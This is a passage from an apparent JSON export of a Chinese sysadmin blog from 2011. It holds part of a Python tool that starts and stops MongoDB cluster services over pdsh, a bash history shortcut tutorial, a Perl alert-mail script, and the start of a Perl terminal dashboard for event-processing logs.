命令\n    def _start_srv(self,host,prog):\n#当执行start all\n        if prog == 'all':\n            for h in self.hosts:\n                if getattr(self,'%s_mongod' % h):\n                    for str in ','.join(getattr(self,'%s_mongod' % h)).split(','):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s cat /etc/%s.conf|grep -v \"#\"|grep port' % (h,str)\n                        port=os.popen(cmd).readline().split('=')[1]\n                        cmds = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp |grep %s' % (h,port)\n                        true = os.popen(cmds).readline()\n                        if true != '':\n                            print 'Please stop and start %s mongod process' % h\n                        else:\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (h,str)\n                            os.system(cmd)\n            for h in self.hosts:\n                if getattr(self,'%s_arbiter' % h):\n                    for str in ','.join(getattr(self,'%s_arbiter' % h)).split(','):\n                        print str\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s cat /etc/%s.conf|grep -v \"#\"|grep port' % (h,str)\n                        port=os.popen(cmd).readline().split('=')[1]\n                        cmds = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp |grep %s' % (h,port)\n                        true = os.popen(cmds).readline()\n                        if true != '':\n                            print 'Please stop and start %s arbiter process' % h\n                        else:\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (h,str)\n                            os.system(cmd)</p>\n\n<p>            for h in self.hosts:\n                if getattr(self,'%s_config' % h):\n                        print ','.join(getattr(self,'%s_config' % h))\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s cat /etc/mongoconfig.conf|grep -v \"#\"|grep port' % h\n                        port=os.popen(cmd).readline().split('=')[1]\n                        cmds = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp |grep %s' % (h,port)\n                        true = os.popen(cmds).readline()\n                        if true != '':\n                            print 'Please stop and start %s config process' % h\n                        else:\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (h,','.join(getattr(self,'%s_config' % h)))\n                            os.system(cmd)\n            for h in self.hosts:\n                if getattr(self,'%s_mongos' % h):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s cat /etc/mongos.conf|grep -v \"#\"|grep port' % h\n                        port=os.popen(cmd).readline().split('=')[1]\n                        cmds = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp |grep %s' % (h,port)\n                        true = os.popen(cmds).readline()\n                        if true != '':\n                            print 'Please stop and start %s mongos process' % h\n                        else:\n                           cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (h,','.join(getattr(self,'%s_mongos' % h)))\n                           os.system(cmd)\n        else:\n            if  host== 'all':\n                host = self.hosts\n            else:\n                host = [host]\n            for i in host:\n                if  prog == '*':\n                    if getattr(self,'%s_mongod' % i):\n                        for str in ','.join(getattr(self,'%s_mongod' % i)).split(','):\n                            print str\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,str)\n                            os.system(cmd)\n                    if getattr(self,'%s_arbiter' % i):\n                        for str in ','.join(getattr(self,'%s_mongod' % i)).split(','):\n                            print str\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,str)\n                            os.system(cmd)\n                    for service in ['config', 'mongos']:\n                        if getattr(self,'%s_%s' % (i,service)):\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,','.join(getattr(self,'%s_%s' % (i,service))))\n                            os.system(cmd)\n                if prog == 'mongod':\n                    if getattr(self,'%s_mongod' % i):\n                        for str in ','.join(getattr(self,'%s_mongod' % i)).split(','):\n                            print str\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,str)\n                            os.system(cmd)\n                if prog == 'mongos':\n                    print ','.join(getattr(self,'%s_mongos' % i))\n                    if getattr(self,'%s_mongos' % i):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,','.join(getattr(self,'%s_mongos' % i)))\n                        os.system(cmd)\n                if prog == 'config':\n                    print ''.join(getattr(self,'%s_config' % i))\n                    if getattr(self,'%s_config' % i):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,','.join(getattr(self,'%s_config' % i)))\n                        os.system(cmd)\n                if prog == 'arbiter':\n                    print ','.join(getattr(self,'%s_arbiter' % i))\n                    if getattr(self,'%s_arbiter' % i):\n                        for str in ','.join(getattr(self,'%s_mongod' % i)).split(','):\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s start' % (i,str)\n                        os.system(cmd)\n#当执行stop 的一些设置\n    def _stop_srv(self, host, prog, now):\n        if host == 'all':\n            host = self.hosts\n        else:\n            host = [host]\n        verify = None\n#当执行 stop all\n        if prog == 'all':\n            if not now:\n#执行前做确定验证，并倒计时3秒\n                try:\n                    verify = raw_input(colored(\"Are you sure to stop all? (y/n) \",\"yellow\")).lower()\n                    if verify == 'y':\n                        print \"&gt;&gt;&gt; Waiting 3 seconds before stoping...\"\n                        print \"&gt;&gt;&gt; (Control-C to abort)...\"\n                        print \"&gt;&gt;&gt; Stoping in:\",</p>\n\n<p>                        for i in range(3, 0, -1):\n                            print colored('%d','red') % i,\n                            sys.stdout.flush()\n                            time.sleep(1)\n                        print\n                    else:\n                        return\n                except KeyboardInterrupt:\n                    print\n                    return\n#stop 过程逻辑\n            for host in self.hosts:\n                if getattr(self,'%s_mongos' % host):\n                    ','.join(getattr(self,'%s_mongos' % host))\n                    cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (host,','.join(getattr(self,'%s_mongos' % host)))\n                    os.system(cmd)\n            for host in self.hosts:\n                if getattr(self,'%s_config' % host):\n                    print ','.join(getattr(self,'%s_config' % host))\n                    cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (host,','.join(getattr(self,'%s_config' % host)))\n                    os.system(cmd)\n            for host in self.hosts:\n                if getattr(self,'%s_arbiter' % host):\n                    for str in ','.join(getattr(self,'%s_arbiter' % host)).split(','):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (host,str)\n                        os.system(cmd)\n            for host in self.hosts:\n                if getattr(self,'%s_mongod' % host):\n                    for str in ','.join(getattr(self,'%s_mongod' % host)).split(','):\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (host,str)\n                            os.system(cmd)\n#当执行stop service@XX 逻辑过程\n        else:\n            for i in host:\n                if  prog == '*':\n                    if getattr(self,'%s_mongod' % i):\n                        for str in ','.join(getattr(self,'%s_mongod' % i)).split(','):\n                            print str\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (i,str)\n                            os.system(cmd)\n                    for service in ['arbiter', 'config', 'mongos']:\n                        if getattr(self,'%s_%s' % (i,service)):\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (i,','.join(getattr(self,'%s_%s' % (i,service))))\n                            os.system(cmd)\n                if prog == 'mongod':\n                    if getattr(self,'%s_mongod' % i):\n                        for str in ','.join(getattr(self,'%s_mongod' % i)).split(','):\n                            print str\n                            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (i,str)\n                            os.system(cmd)\n                if prog == 'mongos':\n                    if getattr(self,'%s_mongos' % i):\n                        print ','.join(getattr(self,'%s_mongos' % i))\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (i,','.join(getattr(self,'%s_mongos' % i)))\n                        os.system(cmd)\n                if prog == 'config':\n                    if getattr(self,'%s_config' % i):\n                        print ','.join(getattr(self,'%s_config' % i))\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (i,','.join(getattr(self,'%s_config' % i)))\n                        os.system(cmd)\n                if prog == 'arbiter':\n                    if getattr(self,'%s_arbiter' % i):\n                        print ','.join(getattr(self,'%s_arbiter' % i))\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s /etc/init.d/%s stop' % (i,','.join(getattr(self,'%s_arbiter' % i)))\n                        os.system(cmd)\n#当执行help打印一些帮助信息\n    def _show_help(self):\n        help = \" CMD                        ARGS                          DESCRIPTOR               \\n\" \\\n             \" ==============================================================================         \\n\" \\\n             \" start/stop       all/mongod/arbiter/config/mongos        启动关闭进程          \\n\" \\\n             \" 注：启动关闭方式：1 start/stop service@host \\n\"  \\\n             \"                   2 start/stop all（相当于start/stop * \\n\" \\\n             \"                   3 start/stop service     \\n\" \\\n             \" 例子：停止集群mongos服务： stop  mongos \\n\" \\\n             \"       启动集群mg02主机的config服务：start  config@mg02 \\n\" \\\n             \"       停止整个集群服务： stop all\\n\" \\\n             \" help                                                     找到帮助      \\n\" \\\n             \" show                                                     查看当前启动进程      \\n\" \\\n             \" status                                                   查看状态     \\n\" \\\n             \" ==============================================================================         \\n\"\n        print help                 </p>\n\n<p>#Shell累 主要是用户操作的一些指导\nclass Shell:\n#设定进入Shell显示的颜色和语言\n    PROMPT = colored('root','green') + colored('@MongoDB# ','red')\n#初始化函数 设定配置文件conf.cfg，命令行限制可以使用的几个命令\n    def __init__(self):\n        confile = os.path.join(\"\", '/etc/conf.cfg')\n        self.cmds = ['start', 'stop', 'show', 'log', 'help','status']\n#调用类Manager\n        self.manager = Manager(confile)\n#        self.pro = Cfg(confile)\n    def start(self):\n        readline.set_completer(self._completer)\n        readline.parse_and_bind(\"tab: complete\")\n        while True:\n            try:\n                cmd = raw_input(self.PROMPT)\n            except EOFError:\n                print colored('Exit','green')\n                exit(0)\n            except KeyboardInterrupt:\n                print colored('type ctrl-D to exit Mongo Manager Shell','yellow')\n                continue\n            if cmd:\n                self._parse_cmd(cmd)\n    def _completer(self, word, index):\n        matches = [c for c in self.cmds if c.startswith(word)]\n        try:\n            return matches[index] + ''\n        except IndexError:\n            pass\n    def _shell(self, cmd):\n        print 'Mongo-Shell: \"%s\": command not find  please input \"help\"' % cmd\n#判断命令开始是不是设定的那几个词语，是-&gt;执行fetch_job函数\n    def _parse_cmd(self, cmd):\n        if cmd.startswith('start') or \\\n                cmd.startswith('stop') or \\\n                cmd.startswith('show') or \\\n                cmd.startswith('status') or \\\n                cmd.startswith('help') or \\\n                cmd.startswith('log'):\n            self.manager.fetch_job(cmd)\n        else:\n            self._shell(cmd)\n#主函数\nif __name__ == '__main__':\n    argc = len(sys.argv)\n    parser = OptionParser(description=\"Use For Mongodb Shell\",prog=\"Mshell.py\",version=\"1.0\",usage=\"%prog\")\n    parser.add_option(\"-v\", \"--verbose\",action=\"count\",help=\"Show Shell Version Information(For more information, please use the option: -vv)\")\n    options, arguments=parser.parse_args()\n#判断是否root\n    if os.geteuid() != 0:\n        print red('Need to be root :(')\n        exit(1)\n#当脚本不带参数引发调用类Shell\n    if argc == 1:\n        test = Shell()\n        test.start()\n#当不了脚本的用户使用-h或者--help  给与doc提示\n    if '-h' in sys.argv  or '--help' in sys.argv:\n        print __doc__\n    elif options.verbose ==1:\n        print __doc__\n    elif options.verbose ==2:\n        print __doc__\n        print \"Version =1.0  Revision time at 2011年 07月 04日\"\n    else:\n        print '请直接运行脚本，不需要附带参数'\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "06"
    }
  },
  {
    "id": 88,
    "title": "Bash History （变态用法）",
    "category": "linux基础",
    "tags": [

    ],
    "url": "/archives/bashhistorybiantaiyongfa/",
    "content": "<p>首先看一个例子：</p>\n\n<p>root@client ~&gt; history</p>\n\n<p>1002  ll /root\n1003  cat moxi\n1004  cd /home/dongwm\n1005  history</p>\n\n<p>1 从历史执行一个特定的命令使用，这里我想要执行“cat moxi”，使用“！histroy前面的数字”</p>\n\n<p>root@client ~&gt; !1003\ncat moxi\n21233 = {\n\"hashAlgorithm\": \"fnv1a_32\",\n\"numReplicas\": 2,\n\"serverList\": [\"192.168.8.138:11211\",\"192.168.8.137:11211\"],\n\"vBucketMap\": [\n[0,2,3],\n[1,2,3]\n]\n}<!--more--></p>\n\n<p>或者：“！-从下网上数倒数第X（本例-3为1003）”</p>\n\n<p>2  执行前面钢之行的命令 使用“!!”</p>\n\n<p>3  使用关键字查找最近执行的某命令，比如 ll这个命令 他就会匹配1002  而不是1002以前的ll命令\nroot@client ~&gt; !ll</p>\n\n<p>4 使用关键字匹配 找到最近包含此字符串的命令：</p>\n\n<p>root@client ~&gt; !?dongwm\ncd /home/dongwm\n5 使用^ str1的替换字符串^ str2 ^，例子一看就懂</p>\n\n<p>root@client ~&gt; ll moxi\n-rw-r--r-- 1 root root 193 Jun 10 18:48 moxi\nroot@client ~&gt; ^ll^cat^\ncat moxi\n6 获取命令的第一个参数，使用“:^”</p>\n\n<p>root@client ~&gt; cp moxi moxi.bak\nroot@client ~&gt; ll !cp:^\nll moxi\n-rw-r--r-- 1 root root 193 Jun 10 18:48 moxi</p>\n\n<p>7 获取命令的最后一个参数，使用“:$”</p>\n\n<p>root@client ~&gt; cp moxi moxi.bak\nroot@client ~&gt; ll !cp:$\nll moxi.bak\n-rw-r--r-- 1 root root 193 Aug 12 10:58 moxi.bak\n8使用命令获取第n个参数，使用“:n”</p>\n\n<p>root@client ~&gt; mv moxi moxi.bak test\nroot@client ~&gt; ll !mv:2\nll moxi.bak\nls: moxi.bak: No such file or directory</p>\n\n<p>9 使用命令获取所有参数，使用“:*”</p>\n\n<p>root@client ~&gt; cp moxi moxi.bak\nroot@client ~&gt; ll !cp:*\nll moxi moxi.bak\n-rw-r--r-- 1 root root 193 Jun 10 18:48 moxi\n-rw-r--r-- 1 root root 193 Aug 12 11:00 moxi.bak\n10 使用命令获取特定参数，使用“:x-y”\nroot@client ~&gt; ll moxi moxi.bak moxi.new\n-rw-r--r-- 1 root root 193 Jun 10 18:48 moxi\n-rw-r--r-- 1 root root 193 Aug 12 11:01 moxi.bak\n-rw-r--r-- 1 root root 193 Aug 12 11:02 moxi.new\nroot@client ~&gt; ll !ll:2-3\nll moxi.bak moxi.new\n-rw-r--r-- 1 root root 193 Aug 12 11:01 moxi.bak\n-rw-r--r-- 1 root root 193 Aug 12 11:02 moxi.new</p>\n\n<p>11从使用的命令中删除结尾的路径名\nroot@client ~&gt; ll test/icinga-cn-web-1.3.1/README\n-rwxr-xr-x 1 root root 1668 Apr 20 16:03 test/icinga-cn-web-1.3.1/README\nroot@client ~&gt; ll !!:$:h\nll test/icinga-cn-web-1.3.1  //去掉了文件具体路径</p>\n\n<p>12 从使用的命令中删除结尾的后缀名</p>\n\n<p>root@client ~&gt; ll test/icinga-cn-web-1.3.1/build.xml\n-rwxr-xr-x 1 root root 171 Apr 20 08:53 test/icinga-cn-web-1.3.1/build.xml\nroot@client ~&gt; ll !!:$:r\nll test/icinga-cn-web-1.3.1/build\n13 模仿sed替换命令值的参数等：</p>\n\n<p>root@client ~&gt; cp /etc/password /etc/password.bak\ncp: cannot stat `/etc/password': No such file or directory\nroot@client ~&gt; !!:gs/password/passwd\ncp /etc/passwd /etc/passwd.bak</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "12"
    }
  },
  {
    "id": 89,
    "title": "使用可以带选项的perl发送中文邮件",
    "category": "cep",
    "tags": [
      "perl邮件"
    ],
    "url": "/archives/shiyongkeyidaixuanxiangdeperlfasongzhongwenyoujian/",
    "content": "<p>为了处理复杂事件处理的故障报警，需要使用perl语言实现邮件报警和短信报警</p>\n\n<p><pre class=\"sh_perl\">\n#!/usr/bin/perl\nuse strict;\nuse Getopt::Long;\nuse MIME::Lite;\nuse MIME::Words qw(encode_mimewords);</p>\n\n<p>my ($title,$sendto,$cc,@data,$help);</p>\n\n<p>GetOptions(\n    'title|t=s'\t    =&gt; \\$title,\n    'sendto|s=s'    =&gt; \\$sendto,\n    'cc|c=s'\t    =&gt; \\$cc,\n    'data|d=s{1,10}'=&gt; \\@data,\n    'h|help'\t    =&gt; \\$help,\n);</p>\n\n<p>if ( $help ) {\nprint &lt;&lt;EOF;\n    -t\t--title\t    标题\n    -s\t--sendto    收件人\n    -c\t--cc\t    抄送人\n    -d\t--data\t    内容\n    -h\t--help\t    帮助\nEOF\n}\nmy @ltime=localtime;\nmy $today=sprintf(\"%04d%02d%02d\",$ltime[5]+1900,$ltime[4]+1,$ltime[3]);\nopen LOG,\"&gt;&gt;/cepdata/notification.log.$today\";</p>\n\n<p>my $data=\"@data\";\n$data =~ s/=/:/g;\nmy $subject = encode_mimewords(\"$title\",'Charset','GB2312');\n$sendto =~ s/(?=,|$)/\\@dongwm.com/g;\n$cc =~ s/(?=,|$)/\\@dongwm.com/g if $cc;</p>\n\n<p>my $msg = MIME::Lite-&gt;new (\n        From =&gt; 'cep@dongwm.com',\n        To =&gt; $sendto,\n\tCc  =&gt; $cc,\n        Subject =&gt; $subject,\n        Type     =&gt; 'text/html',\n        Data     =&gt; $data,\n        Encoding =&gt; 'base64',\n    ) or die \"create container failed: $!\";</p>\n\n<p>$msg-&gt;attr('content-type.charset' =&gt; 'GB2312');\n$msg-&gt;send('smtp','localhost',Debug=&gt;0);\nmy @time=localtime;\nmy $currenttime=sprintf(\"%04d-%02d-%02d %02d:%02d:%02d\",$time[5]+1900,$time[4]+1,$time[3],$time[2],$time[1],$time[0]);\nprint LOG \"$currenttime send mail to $sendto : \\\"$data\\\"\\n\";\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "13"
    }
  },
  {
    "id": 90,
    "title": "复杂事件(cep)处理结果实时展示脚本（perl）",
    "category": "perl",
    "tags": [
      "cep",
      "perl",
      "复杂事件处理"
    ],
    "url": "/archives/fuzashijiancepchulijieguozhanshijiaoben/",
    "content": "<p>前言：复杂事件处理主要用来企业作为应用系统的监测和决策控制，但是我们可能需要一个实时的展示平台，以下脚本实现了终端的彩色终端展示，并支持键盘输入不同的按键刷新不同功能的展示（比如ip访问量的排行，页面访问数的排行等自定义效果）</p>\n\n<p><pre class=\"sh_perl\">\n#!/usr/bin/perl\n#use strict;\n#use warnings;\nuse Term::ReadKey;\nuse Term::ANSIColor;\nuse Getopt::Long;\nuse Pod::Usage;\nuse Time::HiRes qw ( time alarm sleep );\nGetopt::Long::Configure('bundling');</p>\n\n<p>#变量设定\n$|=1;\t\t\t\t\t#激活autoflush，将缓冲区的内容立即送出\n@ltime=localtime();\nmy $date=sprintf(\"%d-%d-%d\",$ltime[5]+1900,$ltime[4]+1,$ltime[3]);\t\t#当天日期\nmy $Clear=`clear`;\t\t\t#调用系统命令 clear\nsub Clear();\t\t\t\t#\nsub GetHead();</p>\n\n<p>#颜色的定义\nimport Term::ANSIColor ':constants';\nmy $RESET  = RESET()   || '';\nmy $YELLOW = YELLOW()  || '';\nmy $RED    = RED()     || '';\nmy $GREEN  = GREEN()   || '';\nmy $BLUE   = BLUE()    || '';\nmy $WHITE  = WHITE()   || '';\nmy $BOLD   = BOLD()    || '';</p>\n\n<p>#读取配置文件\nmy $config='/cepdata/conf/ceptop.cfg';\nmy %config;\t\t\t\t#配置文件hash\nget_config();\t\t\t\t#读取配置文件内容，存入%config</p>\n\n<p>#读取命令行参数\nmy @opt_spec=(\n\t{ s =&gt; 'h', d =&gt; 'display help message'},\n\t{ s =&gt; 'p', d =&gt; '选择默认展示页面'},\n);\nGetOptions(\n\t\"p=s\" =&gt; \\$choose,\n\t\"h\"\t  =&gt; \\$help\t\n) or pod2usage(1);</p>\n\n<p>if ($help) {\n\tforeach my $spec (sort {$a-&gt;{s} cmp $b-&gt;{s}}  @opt_spec) {\n        printf \"  -%-4s %-15s\\n\",$spec-&gt;{s},$spec-&gt;{d};\n\t\tif (\"$spec-&gt;{s}\" eq 'p') {\n\t\t\tforeach my $page (sort keys %{$config{pagelist}}) {\n\t\t\t\tprintf \"%10s =&gt; %-10s\\n\",$config{pagelist}{$page}-&gt;{hotkey},$config{pagelist}{$page}-&gt;{desc} || $page;\n\t\t\t\t\t}\n\t\t\t}\n    }\n\texit 0;\n}</p>\n\n<p>Clear();\n#日志目录\nmy $LogPath=$config{main}-&gt;{logpath}; \n#页面切换的准备\nmy %pagelist;\t\t\t\t\t#为页面切换准备的hash, hotkey  =&gt; Page\nmy $hotkeylist;\t\t\t\t\t# qr/[abc]/ a,b,c为快捷键\nfor_change_page();\t\t\t\t#读取%config中的pagelist，生成%pagelist</p>\n\n<p>my %printlist=reverse %pagelist;\nmy $listline;\nforeach my $page (sort keys %printlist) {\n\tif ($page =~ /^C/) {\n\t    $listline .=\"\\e[0;31m&lt;$printlist{$page}&gt;\\e[0;32m$page\\t\";\n\t} elsif ($page =~ /^Java/) {\n\t    $listline .=\"\\e[0;31m&lt;$printlist{$page}&gt;\\e[0;33m$page\\t\";\n\t} elsif ($page =~ /^Ops/) {\n            $listline .=\"\\e[0;31m&lt;$printlist{$page}&gt;\\e[0;36m$page\\e[0m\\t\";\n\t} elsif ($page =~ /^Php/) {\n            $listline .=\"\\e[0;31m&lt;$printlist{$page}&gt;\\e[0;34m$page\\e[0m\\t\";\n        }\n      }</p>\n\n<p>#打开所有文件句柄\nforeach my $fh (values %pagelist) {\n\t\tmy $logfile;\n        if ($config{pagelist}-&gt;{$fh}-&gt;{logfile} =~ /^\\//) {\n            $logfile=\"$config{pagelist}-&gt;{$fh}-&gt;{logfile}.$date\";\n        } else {\n            $logfile=\"$LogPath/$config{pagelist}-&gt;{$fh}-&gt;{logfile}.$date\";\n        }\n\t\topen $fh,\"&lt;$logfile\";\t\t#为每个日志文件打开句柄，句柄名为页面名\n\t}</p>\n\n<p>my $warning='99999';\nmy $critimal='99999';\nmy $Page=$pagelist{$choose} || $config{main}-&gt;{defaultpage};\t#默认页面\n#GetOptions(\n#\t'p:s' =&gt; \\$Page,\n#\t'w:f' =&gt; \\$warning,\n#\t'c:f' =&gt; \\$critimal,\n#\t'f:i' =&gt; \\$SortOrder,\n#\t);\nChangePage();\t\t\t\t\t#切换页面，改变参数</p>\n\n<p>#页面切换相关变量\nmy $key=0;\t\t\t\t\t#捕获键盘输入，默认值0\nmy $lines_left;\t\t\t\t\t#终端行数\nmy $diff=0;\t\t\t\t\t#值为1时,切换页面\nmy $listpages=0;\t\t\t\t#值为1时,显示页面列表供切换</p>\n\n<p>print RED();\nprint \"Waiting for New Data.....\\n\";\nprint RESET();</p>\n\n<p>#============#\n# Main Loop\t #\n#============#</p>\n\n<p>#ReadMode\n#    0    Restore original settings.\n#    1    Change to cooked mode.\n#    2    Change to cooked mode with echo off. \n#          (Good for passwords)\n#    3    Change to cbreak mode.\n#    4    Change to raw mode.\n#    5    Change to ultra-raw mode.</p>\n\n<p>#ReadKey\n#    0    Perform a normal read using getc\n#    -1   Perform a non-blocked read\n#    &gt;0   Perform a timed read</p>\n\n<p>#ReadLine\n#    0    Perform a normal read using scalar(&lt;FileHandle&gt;)\n#    -1   Perform a non-blocked read\n#    &gt;0   Perform a timed read</p>\n\n<p>ReadMode(3);\nwhile (1) {\n\tif ( $diff ) {\n\t\t\tChangePage();\t\t#切换页面，改变参数\n\t\t\t$diff = 0;\t\t#改为0,下次循环跳过页面切换\n\t\t\t}\n\t&amp;GetMtime(new);\n\tif (\"$new_mtime\" == \"$old_mtime\") {\t#文件修改时间未变化时\n\t\tsleep 0.1;\t\t\t#sleep 0.5秒\n\t\tnext;\t\t\t\t#继续主循环\n\t\t} \n\telse {\n\t\tGetHead();\t\t\t#设置终端参数，输出描述信息\n\t\tOutPut();\t\t\t#输出页面内容\n\t\t$key=ReadKey(5);\t\t#捕获键盘输入\n\t\t}\n\tunless ($key) {\t\t\t\t#没有键盘输入时\t\t\n\t\tnext;\t\t\t\t#继续主循环\n\t\t}\n\tif ( $key =~ /q/ ) {\t\t\t#键入 q ，退出程序\n\t\tReadMode(0);\n\t\tprint \"\\n\";\n\t\texit;\n\t\t}\n\tif ( $key =~ /l/ ) {\t\t\n\t\t$listpages= $listpages?0:1;\n\t\tif ($listpages) {\n\t\tprint \"$listline\\n\";\n\t\t}\n\t\t$key=0;\n\t\tReadMode(3);\n\t\t}\n\tif ( $key =~ /p/ ) {\n        print RED();\n\t\tprint '-- paused. press any key to resume --';\t\t\t\t\t#暂停页面输出\n\t\tprint RESET();\n        ReadKey(0);\n        next;\n\t\t$key=0;\n\t\t}\n\tif ( $key =~ $hotkeylist ) {\t\t\t#读入快捷键\n\t\tReadMode(0);\n\t\t$Page=$pagelist{$key};\t\t\t#根据快捷键切换改变默认页面\n\t\t$diff =1;\t\t\t\t#将$diff设置为1,下次主循环会先进行页面切换工作\n\t\tprint RED(),\"FLUSH AT NEXT TIME\";\t\t\t\t\n\t\tprint RESET();\t\t\t\n\t\tReadMode(3);\t\n\t\t$key=0;\t\t\t\t\t#将捕获键盘输入设为0\n\t\t$listpages=0;\n\t\tnext;\n\t\t}\n}</p>\n\n<p>#==========#\n#  子程序  #\n#==========#</p>\n\n<p>#==清屏==#\nsub Clear()\n{\n\tprint \"$Clear\";\n}</p>\n\n<p>#==打印描述信息==#\nsub GetHead()\n{\n\tmy ($width, $height, $wpx, $hpx) = GetTerminalSize();\t#获取终端长宽高等信息\n    $lines_left = $height - 3;\t\t\t\t\t#获取行数，并预留3行\n\tmy $time=`date +%T`;\n\tchomp($time);\n\tClear();\t\t\t\t\t\t#清屏\n\tprint GREEN();\n\tprint \"Page: $desc\\t\\tTime: $time\\n\";\t\t\t#打印页面描述，当前时间\n\t$lines_left--;\n\tprint RESET();\n}\t\t\t</p>\n\n<p>#==页面内容输出==#\nsub OutPut{</p>\n\n<p>    print YELLOW();\n    printf \"$f_title\\n\",@Fieldname;  #打印标题\n    #printf \"$f_title\\n\",$Fieldname[0],$Fieldname[1],$Fieldname[2],$Fieldname[3],$Fieldname[4];  #打印标题\n\t$lines_left--;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</p>\n\n<p>    print RED();\n    printf \"$f_title\\n\",'-' x $F_gang[0],'-' x $F_gang[1],'-' x $F_gang[2],'-' x $F_gang[3],'-' x $F_gang[4],'-' x $F_gang[5];\t#打印 -----\n    $lines_left--;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\tprint RESET();</p>\n\n<p>\t#记录了所有行\n\tmy @record;\n\tmy $href;\n\twhile (&lt;$Page&gt;) {\n\t\tchomp();\n\t\tif ($_ =~ $regex) {\t\t\t\t\t\t#正则匹配取出所需值\n\t\tnext if (\"$4\" eq \"-\");\n\t\tif (\"$Page\" eq \"OpsAgent\") {\n\t\t\tmy $agent = substr(\"$4\",0,100);\n\t\t\t$href = {'1'=&gt;$1,'2'=&gt;$2,'3'=&gt;$3,'4'=&gt;$agent,'5'=&gt;$5,'6'=&gt;$6};\n\t\t\t} else {\n\t\t\t$href = {'1'=&gt;$1,'2'=&gt;$2,'3'=&gt;$3,'4'=&gt;$4,'5'=&gt;$5,'6'=&gt;$6};\t#引用hash\n\t\t\t}\n\t\tpush @record,$href;\t\t\t\t\t\t#将引用存入数组\n\t\t\t}\n\t}</p>\n\n<p>\t#排序并输出\n\tmy @sorted;\n\t@sorted = sort { $b-&gt;{$SortOrder} &lt;=&gt; $a-&gt;{$SortOrder} } @record;\n\tforeach my $row (@sorted) {\n\t\tlast unless $lines_left;\n\t\tprintf \"$format\\n\",$row-&gt;{1},$row-&gt;{2},$row-&gt;{3},$row-&gt;{4},$row-&gt;{5},$row-&gt;{6};\n\t\t$lines_left--;\n\t}</p>\n\n<p>\t#打印常用功能键\n\tprint \"\\n\" while ($lines_left--);\n\tprint RED(),\"&lt;l&gt;\",BLUE(),\"PAGELIST\\t\",RED(),\"&lt;p&gt;\",BLUE(),\"PAUSE\\t\",RED(),\"&lt;q&gt;\",BLUE(),\"QUIT\\n\",RESET();</p>\n\n<p>\t#打印页面切换的快捷键\n        print \"$listline\\n\" if ($listpages);</p>\n\n<p>\t#记录文件修改时间\n\t&amp;GetMtime(old);\n}</p>\n\n<p>#==读取配置文件==#\nsub get_config\n{\n\topen CEPCONF,\"&lt;$config\" or die \"can't open configfile!\";\t#打开配置文件\n\twhile (&lt;CEPCONF&gt;) {\n\t\tnext if /^$/;\t\t\t\t\t\t#忽略空行\n\t\tnext if 